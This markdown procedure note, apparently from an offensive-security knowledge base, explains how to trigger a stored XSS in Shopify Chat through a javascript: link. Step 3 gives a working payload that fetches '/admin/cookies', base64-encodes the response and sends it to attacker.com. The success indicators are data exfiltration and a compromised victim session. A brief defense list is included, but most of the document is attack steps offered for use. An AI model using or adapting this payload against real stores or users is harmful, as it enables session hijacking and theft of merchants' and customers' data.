---
id: proc-uuid-3
name: Trigger XSS Execution via Malicious Link
tags:
  - xss
  - execution
  - javascript
  - shopify
type: procedure
tools: []
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:55:38.336Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Trigger XSS Execution via Malicious Link

## Summary

This procedure triggers the stored XSS by clicking the injected javascript: URI in Shopify Chat, executing arbitrary JavaScript in the victim's browser context, potentially leading to session hijacking or data theft.

## Description

Once the payload is stored, clicking the link interprets the javascript: scheme as executable code rather than a navigation URL. This affects frontend users (self-XSS) and admins viewing chats, running in the store's domain context. Prerequisites: Stored payload from previous step. Expected outcome: Script execution, demonstrated by alert or custom actions like cookie theft.

## Requirements

1. Stored malicious link in active chat session
2. Victim access to the chat (user or admin)
3. Modern web browser without strict URL policies

## Defense

Defensive measures and detection strategies:

- Browser-level protections like Content Security Policy (CSP) blocking inline scripts
- Client-side URL validation before navigation
- Admin training to avoid clicking untrusted links in chats

## Objectives

1. Execute JavaScript in victim browser
2. Achieve code injection for data collection or escalation
3. Demonstrate impact like alert or exfiltration

## Instructions

### Step 1: Locate Malicious Link

**Context**: Identify the stored payload in the chat for the victim to interact with.

Open the chat history on the store homepage or Shopify Ping, locate the message with the disguised URL.

### Step 2: Click the Link

**Context**: Simulate or induce the victim to click, triggering execution.

Click the hyperlink in the chat message.

> The browser executes `alert(1)` due to the javascript: prefix, bypassing standard URL handling.

**Expected Output**: Alert dialog with "1" appears; console logs script execution.

### Step 3: Escalate Payload

**Context**: Replace alert with malicious code for real impact.

Modify payload to something like `javascript:fetch('/admin/cookies').then(r=>r.text()).then(d=>location='https://attacker.com?data='+btoa(d))//https://example.com` to exfiltrate data.

**Expected Output**: Data sent to attacker-controlled server.

**Success Indicators**:
- Script runs without errors
- Custom actions (e.g., network requests) succeed
- Victim session compromised if escalated

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Collection]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[Execution]]
- [[JavaScript]]
- [[shopify]]
